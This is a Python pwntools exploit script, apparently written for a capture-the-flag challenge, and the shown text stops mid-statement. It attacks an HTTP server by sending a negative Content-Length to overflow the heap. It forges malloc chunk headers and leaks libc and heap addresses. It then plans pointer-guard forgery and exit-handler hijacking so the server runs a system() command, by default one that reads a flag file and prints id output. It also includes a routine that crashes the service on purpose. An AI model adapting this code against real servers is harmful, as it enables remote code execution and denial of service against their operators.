import os
import socket
from dataclasses import dataclass
from time import monotonic

from pwn import *


class config:
    file: str = "chal"
    libc: str = "libc.so.6"
    host: str = "127.0.0.1"
    port: int = 9999

USE_SSL = True
if args.NOSSL:
    USE_SSL = False

CHAL_GLIBC_TUNABLES = (
    "glibc.malloc.tcache_count=0:"
    "glibc.malloc.tcache_max=0:"
    "glibc.malloc.arena_max=8"
)

SIZE_SZ = 8
MINSIZE = 0x20
MALLOC_ALIGN_MASK = 0xF
HEADER_KEY_OFF = 0x10
PREV_INUSE = 0x1
NONCONTIGUOUS_BIT = 0x2
NON_MAIN_ARENA_FLAG = 0x4

ARENA_MAX = 8

LEAK_CHUNK_SIZE = 0x510
LEAK_P_CHUNK_SIZE = LEAK_CHUNK_SIZE
LEAK_R_CHUNK_SIZE = LEAK_CHUNK_SIZE
LEAK_P_HEADER_CHUNK_SIZE = 0x30
LEAK_P_KEEPALIVE_HEADER_CHUNK_SIZE = 0x30
LEAK_R_HEADER_CHUNK_SIZE = 0x30
LEAK_CARVE_CHUNK_SIZE = (
    LEAK_P_KEEPALIVE_HEADER_CHUNK_SIZE
    + LEAK_P_CHUNK_SIZE
    + LEAK_R_HEADER_CHUNK_SIZE
)
LEAK_FORGED_FREE_SIZE = (
    LEAK_P_CHUNK_SIZE + LEAK_R_HEADER_CHUNK_SIZE + LEAK_R_CHUNK_SIZE
)
LEAK_NEG_TO_P_HEADER = 0x10
LEAK_NEG_TO_P_KEEPALIVE_HEADER = 0x40
LEAK_NEG_TO_P_BODY_HEADER = 0x70
LEAK_NEG_TO_R_HEADER = LEAK_NEG_TO_P_BODY_HEADER + LEAK_P_CHUNK_SIZE
MAIN_HEAP_LEAK_OFF = 0xDA0
MAIN_NEG_USER_OFF = 0x2B0

MALLOC_STATE_BINS_OFF = 0x18
UNSORTED_BIN_OFF = MALLOC_STATE_BINS_OFF - 0x10
MALLOC_STATE_MUTEX_OFF = 0x0
MALLOC_STATE_FLAGS_OFF = 0x4
MALLOC_STATE_TOP_OFF = 0x8
MALLOC_STATE_LAST_REMAINDER_OFF = 0x10
MALLOC_STATE_BINMAP_OFF = 0x808
MALLOC_STATE_NEXT_OFF = 0x818
MALLOC_STATE_NEXT_FREE_OFF = 0x820
MALLOC_STATE_ATTACHED_THREADS_OFF = 0x828
MALLOC_STATE_SYSTEM_MEM_OFF = 0x830
MALLOC_STATE_MAX_SYSTEM_MEM_OFF = 0x838

PIVOT_LARGE_CHUNK_SIZE = 0x710
PIVOT_GUARD_CHUNK_SIZE = 0x710
PIVOT_SORT_CHUNK_SIZE = 0x810
PIVOT_NEG_USER_OFF = 0x8B0
PIVOT_TRIGGER_HEADER_OFF = 0xE90
PIVOT_SMASH_HEADER_OFF = 0xEC0
PIVOT_REMAINDER_HEADER_OFF = 0xEF0
PIVOT_REMAINDER_VALUE_OFF = 0xF40
PIVOT_LARGE_HEADER_OFF = 0x13A0
PIVOT_TOP_AFTER_SORT_OFF = 0x29D0
PIVOT_LARGEBIN_OFF = 0x4B8
TOP_SMASH_BODY_CHUNK_SIZE = 0x900
REMAINDER_STUB_BODY_LEN = 1
REMAINDER_VICTIM_OFF = 0x3200
REMAINDER_AFTER_SIZE = 0x1000

MAIN_TLS_FS_BASE_OFF = -0x28C0
TLS_POINTER_GUARD_OFF = 0x30
TLS_CANCELHANDLING_OFF = 0x308
UNWIND_FORCED_UNWIND_OFF = 0x8
UNWIND_GLOBAL_OFF = 0x1EB2C0
UNWIND_GLOBAL_LIBGCC_HANDLE_OFF = 0x1EB2A8
UNWIND_STORED_BASE = 0x1
MAIN_CANCEL_BYTE_WRITE_BACKSHIFT = 7
MAIN_CANCEL_BYTE_WRITE_VALUE = 0x0800000000000001
GLOBAL_LIBGCC_HANDLE_VALUE = 0x1001

EXIT_INITIAL_OFF = 0x1E5160
EXIT_LIST_FNS_OFF = 0x10
EXIT_FUNCTION_SIZE = 0x20
EXIT_EXISTING_HANDLER_INDEX = 0
EXIT_FUNCTION_CXA_FN_OFF = 0x8
EXIT_FUNCTION_CXA_ARG_OFF = 0x10

HEAP_SYSTEM_COMMAND_OFF = 0x2001
LOCAL_SYSTEM_COMMAND = b"sleep 5"
DOCKER_SYSTEM_COMMAND = (
    b"bash -c 'for f in /proc/self/fd/*; do "
    b"n=${f##*/}; "
    b"(id; cat /app/flag.txt 2>/dev/null) 2>/dev/null >&$n; "
    b"done'"
)


exe = ELF(config.file, checksec=False)
libc = ELF(config.libc, checksec=False)
context.binary = exe

server = None
holder_sockets = []
pinned_sockets = []
arena_slots: dict[int, list["PoolSlot"]] = {i: [] for i in range(ARENA_MAX)}


@dataclass
class PoolSlot:
    idx: int
    tube: object
    label: bytes
    busy: bool = False


@dataclass
class UnsortedLeakState:
    label: bytes
    arena_idx: int
    leak_kind: str
    neg: PoolSlot
    neg_sent: int
    neg_user_off: int
    fd: int
    bk: int
    primary: int
    heap_leak: int | None = None
    heap_base: int | None = None
    top_smash_slot: PoolSlot | None = None
    remainder_slot: PoolSlot | None = None


@dataclass
class RemainderWritePlan:
    write_addr: int
    write_value: int
    remainder: int
    victim: int
    nb: int
    body_len: int
    top_size: int
    system_mem: int
    written_value: int


@dataclass
class MainCancelRcePlan:
    fs_base: int
    pointer_guard: int
    cancelhandling: int
    unwind_forced: int
    global_libgcc_handle: int
    target: int
    stored: int
    guard: int
    system_target: int
    system_stored: int
    exit_fn: int
    exit_arg: int
    command: bytes
    command_addr: int | None = None


def arg_int(value, default: int) -> int:
    if value is None or value == "":
        return default
    return int(str(value), 0)


def arg_float(value, default: float) -> float:
    if value is None or value == "":
        return default
    return float(str(value))


def fmt_ptr(value) -> str:
    return "None" if value is None else f"{value:#x}"


def is_user_pointer(value: int) -> bool:
    return 0x10000 <= value < 0x800000000000


def delay(seconds: float) -> None:
    sleep(seconds * arg_float(args.DELAY, 1.0))


def checked_arena_idx(
    name: str,
    value,
    default: int,
    allow_main: bool = True,
) -> int:
    idx = arg_int(value, default)
    if idx < 0 or idx >= ARENA_MAX:
        log.failure(f"{name} must be in [0, {ARENA_MAX - 1}], got {idx}")
    if not allow_main and idx == 0:
        log.failure(f"{name} must select a non-main arena class")
    return idx


def system_command() -> bytes:
    raw = args.CMD
    if raw is None or raw == "":
        command = DOCKER_SYSTEM_COMMAND if args.DOCKER or args.REMOTE else LOCAL_SYSTEM_COMMAND
    else:
        command = str(raw).encode()
    if b"\x00" in command:
        log.failure("CMD may not contain a NUL byte")
    if len(command) + 1 > 0x300:
        log.failure(f"CMD is too long for the heap stash: {len(command)} bytes")
    return command + b"\x00"


def local_process_env() -> dict[str, str]:
    env = os.environ.copy()
    extra = env.pop("EXTRA_GLIBC_TUNABLES", "")
    if extra:
        env["GLIBC_TUNABLES"] = CHAL_GLIBC_TUNABLES + ":" + extra
    else:
        env["GLIBC_TUNABLES"] = CHAL_GLIBC_TUNABLES
    return env


def wait_for_port(host: str, port: int) -> None:
    for _ in range(200):
        try:
            io = remote(host, port, ssl=USE_SSL)
            io.close()
            return
        except PwnlibException:
            delay(0.05)
    log.failure("server did not start")


def recv_alive_probe(timeout: float = 3.0) -> bool:
    host, port = host_port()
    io = None
    try:
        io = remote(host, port, ssl=USE_SSL, timeout=timeout)
        io.send(b"GET /reset-probe HTTP/1.1\r\nConnection: close\r\n\r\n")
        resp = recv_response(io, timeout=timeout)
        return body_of(resp) == b"Try Harder.\n"
    except (EOFError, PwnlibException, OSError):
        return False
    finally:
        if io is not None:
            close_socket(io)


def reset_external_service() -> None:
    if not (args.REMOTE or args.LOCAL) or args.NORESET:
        return

    host, port = host_port()
    crash_bytes = arg_int(args.CRASHBYTES, 0x400000)
    chunk_size = arg_int(args.CRASHCHUNK, 0x10000)
    if crash_bytes <= 0 or chunk_size <= 0:
        log.failure("CRASHBYTES and CRASHCHUNK must be positive")

    log.info(
        "crashing existing service process for a clean slate: "
        f"bytes={crash_bytes:#x}"
    )
    with context.quiet:
        io = None
        try:
            io = remote(
                host,
                port,
                ssl=USE_SSL,
                timeout=arg_float(args.CRASHTIMEOUT, 5.0),
            )
            io.send(b"POST /reset HTTP/1.1\r\nContent-Length: -1\r\n\r\n")
            chunk = b"A" * chunk_size
            sent = 0
            while sent < crash_bytes:
                take = min(chunk_size, crash_bytes - sent)
                try:
                    io.send(chunk[:take])
                except (EOFError, PwnlibException, OSError):
                    break
                sent += take
            try:
                io.shutdown("send")
            except (EOFError, PwnlibException, OSError):
                pass
            try:
                io.recv(timeout=arg_float(args.CRASHRECVTIMEOUT, 1.0))
            except (EOFError, PwnlibException, OSError):
                pass
        finally:
            if io is not None:
                close_socket(io)

    delay(arg_float(args.RESETDELAY, 1.0))
    deadline = monotonic() + arg_float(args.RESTARTTIMEOUT, 20.0)
    while monotonic() < deadline:
        if recv_alive_probe(timeout=arg_float(args.PROBETIMEOUT, 3.0)):
            log.success("service is responding after reset")
            return
        delay(0.2)
    log.failure("service did not come back after reset")


def start() -> None:
    global server

    if args.REMOTE or args.LOCAL:
        return

    env = local_process_env()
    server = process([config.file], env=env)
    wait_for_port(config.host, config.port)


def host_port() -> tuple[str, int]:
    return args.HOST or config.host, arg_int(args.PORT, config.port)


def raw_socket(timeout: float = 2.0) -> socket.socket:
    return socket.create_connection(host_port(), timeout=timeout)


def close_socket(sock: socket.socket) -> None:
    try:
        sock.close()
    except OSError:
        pass


def close_holders() -> None:
    with context.quiet:
        while pinned_sockets:
            close_socket(pinned_sockets.pop())
        for slots in arena_slots.values():
            while slots:
                close_socket(slots.pop().tube)
        while holder_sockets:
            close_socket(holder_sockets.pop())


def drain_rce_output(extra_tubes=None, timeout: float | None = None) -> bool:
    import select

    def tube_fileno(tube) -> int:
        if hasattr(tube, "fileno"):
            return tube.fileno()
        sock = getattr(tube, "sock", None)
        if sock is not None:
            return sock.fileno()
        raise ValueError("tube has no file descriptor")

    sources = []
    seen = set()
    for label, tube in extra_tubes or []:
        ident = id(tube)
        if ident not in seen:
            sources.append((label, tube))
            seen.add(ident)
    for i, tube in enumerate(pinned_sockets):
        ident = id(tube)
        if ident not in seen:
            sources.append((f"pinned-{i}", tube))
            seen.add(ident)
    for arena_idx, slots in arena_slots.items():
        for slot_idx, slot in enumerate(slots):
            ident = id(slot.tube)
            if ident not in seen:
                sources.append((f"arena-{arena_idx}-{slot_idx}", slot.tube))
                seen.add(ident)

    timeout = arg_float(args.OUTTIMEOUT, 3.0 if timeout is None else timeout)
    buffers = {}
    fd_sources = {}
    for label, tube in sources:
        try:
            fd = tube_fileno(tube)
        except (OSError, ValueError):
            continue
        if fd < 0 or fd in fd_sources:
            continue
        buffers[label] = bytearray()
        fd_sources[fd] = (label, tube)

    active = set(fd_sources)
    deadline = monotonic() + timeout
    quiet_deadline = None

    log.info(f"draining RCE output from {len(active)} sockets for up to {timeout:.1f}s")
    while active and monotonic() < deadline:
        wait = min(0.1, max(0.0, deadline - monotonic()))
        try:
            ready, _, _ = select.select(list(active), [], [], wait)
        except (OSError, ValueError):
            live = set()
            for fd in active:
                try:
                    os.fstat(fd)
                except OSError:
                    continue
                live.add(fd)
            if live == active:
                break
            active = live
            continue

        if not ready:
            if quiet_deadline is not None and monotonic() >= quiet_deadline:
                break
            continue

        got_data = False
        for fd in ready:
            label, tube = fd_sources[fd]
            try:
                chunk = tube.recv(4096, timeout=0.01)
            except (EOFError, PwnlibException, OSError):
                active.discard(fd)
                continue
            if not chunk:
                continue
            buffers[label] += chunk
            got_data = True

        if got_data:
            quiet_deadline = monotonic() + 1.0
        elif quiet_deadline is not None and monotonic() >= quiet_deadline:
            break

    printed = set()
    found = False
    for label, data in buffers.items():
        data = bytes(data).strip()
        if not data or data in printed:
            continue
        printed.add(data)
        found = True
        output = data.decode("latin-1", "replace")
        log.success(f"{label} output:\n" + output)
    if not found:
        log.warning("no RCE output received before timeout")
    return found


def body_of(resp: bytes) -> bytes:
    if b"\r\n\r\n" not in resp:
        log.failure(f"response has no body delimiter: {resp[:80]!r}")
    return resp.split(b"\r\n\r\n", 1)[1]


def recv_exact(tube, size: int, timeout: float = 3.0) -> bytes:
    out = bytearray()
    deadline = monotonic() + timeout
    while len(out) < size:
        left = deadline - monotonic()
        if left <= 0:
            break
        chunk = tube.recv(size - len(out), timeout=left)
        if not chunk:
            break
        out += chunk
    return bytes(out)


def recv_response(tube, timeout: float = 3.0) -> bytes:
    head = tube.recvuntil(b"\r\n\r\n", timeout=timeout)
    if not head or b"\r\n\r\n" not in head:
        log.failure(f"missing response header: {head!r}")

    content_length = 0
    for line in head.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            content_length = int(line.split(b":", 1)[1].strip())
            break
    body = recv_exact(tube, content_length, timeout=timeout)
    if len(body) != content_length:
        log.failure(
            f"short response body: got {len(body)}, expected {content_length}"
        )
    return head + body


def body_len_for_chunk(chunk_size: int) -> int:
    if chunk_size < MINSIZE or chunk_size & MALLOC_ALIGN_MASK:
        log.failure(f"invalid chunk size: {chunk_size:#x}")
    return chunk_size - SIZE_SZ - 1


def header_key_for_chunk(chunk_size: int, tag: bytes, val: bytes = b"V") -> bytes:
    if chunk_size < MINSIZE or chunk_size & MALLOC_ALIGN_MASK:
        log.failure(f"invalid header chunk size: {chunk_size:#x}")
    key_len = chunk_size - SIZE_SZ - HEADER_KEY_OFF - 1 - len(val) - 1
    if key_len <= 0:
        log.failure(f"header chunk size is too small: {chunk_size:#x}")
    if len(tag) > key_len:
        log.failure("header tag is too long")
    return tag.ljust(key_len, b"X")


def build_arena_pool(rounds: int) -> None:
    log.info(f"building keep-alive arena pool: {rounds} slots per arena")
    start_delay = arg_float(
        args.POOLSTARTDELAY,
        0.5 if args.REMOTE or args.LOCAL else 0.0,
    )
    connect_delay = arg_float(
        args.POOLCONNECTDELAY,
        0.02 if args.REMOTE or args.LOCAL else 0.0,
    )
    slot_delay = arg_float(
        args.POOLDELAY,
        0.05 if args.REMOTE or args.LOCAL else 0.0,
    )
    pool_timeout = arg_float(
        args.POOLTIMEOUT,
        5.0 if args.REMOTE or args.LOCAL else 3.0,
    )
    if start_delay or connect_delay or slot_delay:
        log.info(
            "arena pool pacing: "
            f"start={start_delay:.3f}s, "
            f"connect={connect_delay:.3f}s, "
            f"slot={slot_delay:.3f}s"
        )
    if start_delay:
        delay(start_delay)
    host, port = host_port()
    for i in range(ARENA_MAX * rounds):
        idx = (i + 1) % ARENA_MAX
        tube = remote(host, port, ssl=USE_SSL, timeout=pool_timeout)
        if connect_delay:
            delay(connect_delay)
        label = f"pool-{idx}-{len(arena_slots[idx])}".encode()
        tube.send(
            b"GET /"
            + label
            + b" HTTP/1.1\r\nConnection: keep-alive\r\n\r\n"
        )
        resp = recv_response(tube, timeout=pool_timeout)
        if body_of(resp) != b"Try Harder.\n":
            log.failure(f"pool warmup failed for arena {idx}: {resp[:80]!r}")
        arena_slots[idx].append(PoolSlot(idx=idx, tube=tube, label=label))
        if slot_delay:
            delay(slot_delay)


def take_arena_slot(idx: int, label: bytes) -> PoolSlot:
    slots = arena_slots[idx]
    while slots:
        slot = slots.pop(0)
        if not slot.busy:
            slot.busy = True
            slot.label = label
            pinned_sockets.append(slot.tube)
            return slot
    log.failure(f"no free pool slot for arena class {idx}")


def slot_send_negative(slot: PoolSlot, path: bytes) -> None:
    slot.tube.send(b"POST " + path + b" HTTP/1.1\r\nContent-Length: -1\r\n\r\n")
    delay(0.08)


def slot_send_blocked_post(
    slot: PoolSlot,
    path: bytes,
    body_len: int,
    prefix: bytes = b"",
    keep_alive: bool = False,
) -> None:
    if len(prefix) >= body_len:
        log.failure("blocked POST prefix must leave at least one byte unread")
    req = (
        b"POST "
        + path
        + b" HTTP/1.1\r\nContent-Length: "
        + str(body_len).encode()
        + b"\r\n"
    )
    if keep_alive:
        req += b"Connection: keep-alive\r\n"
    slot.tube.send(req + b"\r\n" + prefix)
    delay(0.06)


def slot_send_prearmed_post(slot: PoolSlot, path: bytes, body_len: int) -> None:
    slot.tube.send(
        b"POST "
        + path
        + b" HTTP/1.1\r\nContent-Length: "
        + str(body_len).encode()
        + b"\r\n"
    )
    delay(0.06)


def slot_send_prearmed_get(slot: PoolSlot, path: bytes) -> None:
    slot.tube.send(b"GET " + path + b" HTTP/1.1\r\n")
    delay(0.03)


def slot_finish_body(slot: PoolSlot, tail: bytes, timeout: float = 3.0) -> bytes:
    if tail:
        slot.tube.send(tail)
    return recv_response(slot.tube, timeout=timeout)


def slot_send_carve_header(slot: PoolSlot) -> None:
    key = header_key_for_chunk(LEAK_CARVE_CHUNK_SIZE, b"CARVE")
    slot.tube.send(key + b": V\r\n")
    delay(0.1)


def slot_start_prearmed_body(slot: PoolSlot) -> None:
    slot.tube.send(b"\r\n")
    delay(0.1)


def leak_unsorted_overlap(
    label: bytes,
    target_idx: int,
    leak_kind: str,
) -> UnsortedLeakState:
    p_body_len = body_len_for_chunk(LEAK_P_CHUNK_SIZE)
    r_body_len = body_len_for_chunk(LEAK_R_CHUNK_SIZE)
    chunk_flags = PREV_INUSE
    if leak_kind == "arena":
        chunk_flags |= NON_MAIN_ARENA_FLAG

    log.info(
        "unsorted overlap geometry: "
        f"P={LEAK_P_CHUNK_SIZE:#x}, R={LEAK_R_CHUNK_SIZE:#x}, "
        f"carve={LEAK_CARVE_CHUNK_SIZE:#x}, forged={LEAK_FORGED_FREE_SIZE:#x}"
    )

    neg = take_arena_slot(target_idx, label + b"-neg")
    slot_send_negative(neg, b"/" + label + b"-neg")

    p_marker = b"CODEX_" + label.upper() + b"_P_UNSORTED"
    p_slot = take_arena_slot(target_idx, label + b"-P")
    slot_send_blocked_post(
        p_slot,
        b"/" + label + b"-p",
        p_body_len,
        p_marker.ljust(p_body_len - 1, b"P"),
        keep_alive=True,
    )

    r_marker = b"CODEX_" + label.upper() + b"_R_UNSORTED"
    r_slot = take_arena_slot(target_idx, label + b"-R")
    slot_send_blocked_post(
        r_slot,
        b"/" + label + b"-r",
        r_body_len,
        r_marker.ljust(r_body_len - 1, b"R"),
    )

    rescue_slot = take_arena_slot(target_idx, label + b"-RS")
    slot_send_prearmed_post(rescue_slot, b"/" + label + b"-rescue", r_body_len)

    heap_link_slot = None
    if leak_kind == "main":
        heap_link_marker = b"CODEX_" + label.upper() + b"_H_UNSORTED"
        heap_link_slot = take_arena_slot(target_idx, label + b"-H")
        slot_send_blocked_post(
            heap_link_slot,
            b"/" + label + b"-h",
            p_body_len,
            heap_link_marker.ljust(p_body_len - 1, b"H"),
        )

        heap_guard_marker = b"CODEX_" + label.upper() + b"_HG_GUARD"
        heap_guard_slot = take_arena_slot(target_idx, label + b"-HG")
        slot_send_blocked_post(
            heap_guard_slot,
            b"/" + label + b"-hg",
            p_body_len,
            heap_guard_marker.ljust(p_body_len - 1, b"Q"),
        )

    neg_marker = b"CODEX_" + label.upper() + b"_NEG_UNSORT"
    overflow = bytearray(neg_marker.ljust(LEAK_NEG_TO_P_BODY_HEADER + 0x10, b"A"))
    overflow[
        LEAK_NEG_TO_P_HEADER : LEAK_NEG_TO_P_HEADER + 0x10
    ] = p64(0) + p64(LEAK_P_HEADER_CHUNK_SIZE | chunk_flags)
    overflow[
        LEAK_NEG_TO_P_HEADER + 0x10 : LEAK_NEG_TO_P_HEADER + 0x20
    ] = p64(0) + p64(0)
    overflow[
        LEAK_NEG_TO_P_KEEPALIVE_HEADER : LEAK_NEG_TO_P_KEEPALIVE_HEADER + 0x10
    ] = p64(0) + p64(LEAK_P_KEEPALIVE_HEADER_CHUNK_SIZE | chunk_flags)
    overflow[
        LEAK_NEG_TO_P_KEEPALIVE_HEADER
        + 0x10 : LEAK_NEG_TO_P_KEEPALIVE_HEADER
        + 0x20
    ] = p64(0) + p64(0)
    overflow[
        LEAK_NEG_TO_P_BODY_HEADER : LEAK_NEG_TO_P_BODY_HEADER + 0x10
    ] = p64(0) + p64(LEAK_FORGED_FREE_SIZE | chunk_flags)

    log.info("corrupting P body size into a forged span over R")
    neg.tube.send(bytes(overflow))
    delay(0.15)

    p_resp = slot_finish_body(p_slot, b"Z", timeout=3.0)
    if not p_resp.startswith(b"HTTP/1.1 200 OK"):
        log.failure(f"P response was not clean: {p_resp[:100]!r}")

    log.info("carving the forged free chunk so its unsorted remainder overlaps R")
    slot_send_prearmed_get(p_slot, b"/" + label + b"-carver")
    slot_send_carve_header(p_slot)

    if heap_link_slot is not None:
        log.info("freeing a guarded main-heap chunk into unsorted")
        heap_link_resp = slot_finish_body(heap_link_slot, b"Z", timeout=3.0)
        if not heap_link_resp.startswith(b"HTTP/1.1 200 OK"):
            log.failure(
                f"main heap-link response was not clean: {heap_link_resp[:100]!r}"
            )
        delay(0.15)

    log.info("allocating the unsorted remainder as a prearmed rescue body")
    slot_start_prearmed_body(rescue_slot)

    restore_end = LEAK_NEG_TO_R_HEADER + 0x20
    restore = bytearray(b"B" * (restore_end - len(overflow)))
    restore[
        LEAK_NEG_TO_R_HEADER
        - len(overflow) : LEAK_NEG_TO_R_HEADER
        - len(overflow)
        + 0x10
    ] = p64(0) + p64(LEAK_R_HEADER_CHUNK_SIZE | chunk_flags)
    restore[
        LEAK_NEG_TO_R_HEADER
        + 0x10
        - len(overflow) : LEAK_NEG_TO_R_HEADER
        + 0x20
        - len(overflow)
    ] = p64(0) + p64(0)
    log.info("restoring R header metadata before echo cleanup")
    neg.tube.send(bytes(restore))

    r_resp = slot_finish_body(r_slot, b"Z", timeout=3.0)
    if not r_resp.startswith(b"HTTP/1.1 200 OK"):
        log.failure(f"R response was not clean: {r_resp[:100]!r}")
    echo = body_of(r_resp)
    if len(echo) < 0x20:
        log.failure(f"R echo is too short: {len(echo)}")

    fd = u64(echo[0:8])
    bk = u64(echo[8:16])
    log.success(f"unsorted fd leak: {fd:#x}")
    log.success(f"unsorted bk leak: {bk:#x}")
    if fd != bk and leak_kind != "main":
        log.warning("unsorted fd/bk differ; continuing with fd as libc leak")

    heap_leak = None
    heap_base = None
    if leak_kind == "main":
        expected_unsorted = libc.symbols["main_arena"] + UNSORTED_BIN_OFF
        libc_candidates = []
        for ptr in (fd, bk):
            base = ptr - expected_unsorted
            if base & 0xFFF == 0:
                libc_candidates.append((ptr, base))
        if not libc_candidates:
            log.failure(
                "main unsorted leak did not contain a page-aligned libc candidate"
            )
        libc_leak, libc.address = libc_candidates[0]
        for ptr in (fd, bk):
            if ptr != libc_leak:
                heap_leak = ptr
                break
        if heap_leak is None:
            log.warning("main unsorted leak did not contain a distinct heap pointer")
        else:
            heap_base = heap_leak - MAIN_HEAP_LEAK_OFF
        if libc.address & 0xFFF:
            log.error(
                f"libc base is not page aligned: leak={libc_leak:#x}, "
                f"base={libc.address:#x}"
            )
        primary = libc.address
        log.success(f"libc base: {libc.address:#x}")
        log.success(f"main heap leak: {fmt_ptr(heap_leak)}")
        log.success(f"main heap pseudo base: {fmt_ptr(heap_base)}")
    elif leak_kind == "arena":
        primary = fd - UNSORTED_BIN_OFF
        heap_base = primary - 0x30
        if not is_user_pointer(fd):
            log.error(f"arena leak is not a user pointer: fd={fd:#x}")
        if primary & MALLOC_ALIGN_MASK:
            log.error(f"arena leak is not aligned: fd={fd:#x}, arena={primary:#x}")
        log.success(f"non-main arena: {primary:#x}")
        log.success(f"non-main heap base: {heap_base:#x}")
    else:
        log.error(f"unknown leak kind: {leak_kind!r}")
        primary = 0

    return UnsortedLeakState(
        label=label,
        arena_idx=target_idx,
        leak_kind=leak_kind,
        neg=neg,
        neg_sent=restore_end,
        neg_user_off=MAIN_NEG_USER_OFF
        if leak_kind == "main"
        else PIVOT_NEG_USER_OFF,
        fd=fd,
        bk=bk,
        primary=primary,
        heap_leak=heap_leak,
        heap_base=heap_base,
    )


def leak_libc_unsorted() -> UnsortedLeakState:
    target_idx = checked_arena_idx("ARENA", args.ARENA, 0)
    return leak_unsorted_overlap(b"main", target_idx, "main")


def leak_nonmain_unsorted_at(target_idx: int) -> UnsortedLeakState:
    if target_idx <= 0 or target_idx >= ARENA_MAX:
        log.failure(f"non-main arena index out of range: {target_idx}")
    label = f"nm{target_idx}".encode()
    _skipped = take_arena_slot(target_idx, label + b"-split-skip")
    log.info(
        f"targeting non-main arena class {target_idx}; "
        "pinning the first pool slot because later slots share the target heap"
    )
    return leak_unsorted_overlap(label, target_idx, "arena")


def send_heap_overflow(
    state: UnsortedLeakState,
    writes: dict[int, bytes],
    end_off: int,
    filler: bytes = b"A",
) -> None:
    if state.heap_base is None:
        log.failure("heap overflow helper needs a heap leak")
    if len(filler) != 1:
        log.failure("overflow filler must be one byte")

    start_off = state.neg_user_off + state.neg_sent
    if end_off < start_off:
        log.failure(f"invalid overflow end: {end_off:#x} < {start_off:#x}")
    payload = bytearray(filler * (end_off - start_off))
    for off, data in writes.items():
        if off < start_off:
            log.failure(f"write before current negative cursor: {off:#x}")
        if off + len(data) > end_off:
            log.failure(f"write extends past overflow end: {off:#x}")
        payload[off - start_off : off - start_off + len(data)] = data

    state.neg.tube.send(bytes(payload))
    state.neg_sent += len(payload)
    delay(0.2)


def libc_symbol(libc_base: int, name: str) -> int:
    return libc_base + (libc.symbols[name] - libc.address)


def libc_offset(libc_base: int, off: int) -> int:
    return libc_base + off


def rol64(value: int, shift: int) -> int:
    shift &= 63
    return ((value << shift) | (value >> (64 - shift))) & ((1 << 64) - 1)


def ror64(value: int, shift: int) -> int:
    shift &= 63
    return ((value >> shift) | (value << (64 - shift))) & ((1 << 64) - 1)


def main_tls_base(libc_base: int) -> int:
    return libc_base + MAIN_TLS_FS_BASE_OFF


def is_size_shaped(value: int) -> bool:
    return (
        value & MALLOC_ALIGN_MASK == PREV_INUSE
        and (value & ~MALLOC_ALIGN_MASK) >= MINSIZE
    )


def ptr_mangle(value: int, guard: int) -> int:
    return rol64(value ^ guard, 17)


def choose_unwind_stored_value(target: int) -> int:
    middle_nibble = (target & MALLOC_ALIGN_MASK) ^ PREV_INUSE
    stored = UNWIND_STORED_BASE | (middle_nibble << 17)
    if stored & MALLOC_ALIGN_MASK != PREV_INUSE:
        log.failure(f"bad crafted unwind stored value: {stored:#x}")
    if (stored & ~MALLOC_ALIGN_MASK) < MINSIZE:
        stored |= MINSIZE
    return stored


def pointer_guard_for_stored_target(stored: int, target: int) -> int:
    guard = target ^ ror64(stored, 17)
    if not is_size_shaped(guard):
        log.failure(f"crafted pointer guard is not size-shaped: {guard:#x}")
    return guard


def choose_exit_handler_mangle(
    exit_target: int,
    system_target: int,
) -> tuple[int, int, int]:
    exit_stored = choose_unwind_stored_value(exit_target)
    guard = pointer_guard_for_stored_target(exit_stored, exit_target)
    system_stored = ptr_mangle(system_target, guard)
    if not is_size_shaped(system_stored):
        log.failure(
            "mangled system pointer is not compatible with the remainder "
            f"write primitive: {system_stored:#x}"
        )
    return exit_stored, guard, system_stored


def build_remainder_write_plan(
    state: UnsortedLeakState,
    write_addr: int,
    write_value: int = REMAINDER_AFTER_SIZE | PREV_INUSE,
    victim_off: int = REMAINDER_VICTIM_OFF,
) -> RemainderWritePlan:
    if state.heap_base is None:
        log.failure("remainder write plan needs the non-main heap leak")
    if write_value & MALLOC_ALIGN_MASK != PREV_INUSE:
        log.failure(
            "remainder write value must look like an aligned size with "
            f"PREV_INUSE set, got {write_value:#x}"
        )

    after_size = write_value & ~MALLOC_ALIGN_MASK
    if after_size < MINSIZE:
        log.failure(f"remainder size is too small: {after_size:#x}")

    remainder = write_addr - SIZE_SZ

    # Keep nb aligned by matching the forged top's low nibble to the
    # desired remainder.  The useful primitive is the remainder header write.
    victim = state.heap_base + victim_off + (remainder & MALLOC_ALIGN_MASK)
    nb = remainder - victim
    if nb < MINSIZE:
        log.failure(f"remainder target is before forged top: nb={nb:#x}")
    if nb & MALLOC_ALIGN_MASK:
        log.failure(f"internal error: unaligned requested chunk size {nb:#x}")

    body_len = body_len_for_chunk(nb)
    top_size = nb + after_size
    system_mem = top_size
    return RemainderWritePlan(
        write_addr=write_addr,
        write_value=write_value,
        remainder=remainder,
        victim=victim,
        nb=nb,
        body_len=body_len,
        top_size=top_size,
        system_mem=system_mem,
        written_value=write_value,
    )


def build_nonmain_arena_rewrite(
    state: UnsortedLeakState,
    plan: RemainderWritePlan,
) -> bytes:
    if state.heap_base is None:
        log.failure("arena rewrite needs the non-main heap leak")

    body_len = body_len_for_chunk(TOP_SMASH_BODY_CHUNK_SIZE)
    prefix_len = 0x10 + MALLOC_STATE_MAX_SYSTEM_MEM_OFF + SIZE_SZ
    if prefix_len >= body_len:
        log.failure("arena rewrite body would complete the blocked request")

    arena = state.primary
    payload = bytearray(b"\x00" * prefix_len)

    # heap_info tail immediately before the malloc_state.
    payload[0x00:0x08] = p64(0x1000)
    payload[0x08:0x10] = p64(0)

    mstate = bytearray(b"\x00" * (MALLOC_STATE_MAX_SYSTEM_MEM_OFF + SIZE_SZ))
    mstate[MALLOC_STATE_MUTEX_OFF:MALLOC_STATE_MUTEX_OFF + 4] = p32(0)
    mstate[MALLOC_STATE_FLAGS_OFF:MALLOC_STATE_FLAGS_OFF + 4] = p32(
        NONCONTIGUOUS_BIT
    )
    mstate[MALLOC_STATE_TOP_OFF:MALLOC_STATE_TOP_OFF + SIZE_SZ] = p64(
        plan.victim
    )
    mstate[
        MALLOC_STATE_LAST_REMAINDER_OFF:
        MALLOC_STATE_LAST_REMAINDER_OFF + SIZE_SZ
    ] = p64(0)

    for off in range(MALLOC_STATE_BINS_OFF, MALLOC_STATE_BINMAP_OFF, 0x10):
        bin_hdr = arena + off - 0x10
        mstate[off:off + SIZE_SZ] = p64(bin_hdr)
        mstate[off + SIZE_SZ:off + 2 * SIZE_SZ] = p64(bin_hdr)

    mstate[MALLOC_STATE_NEXT_OFF:MALLOC_STATE_NEXT_OFF + SIZE_SZ] = p64(arena)
    mstate[
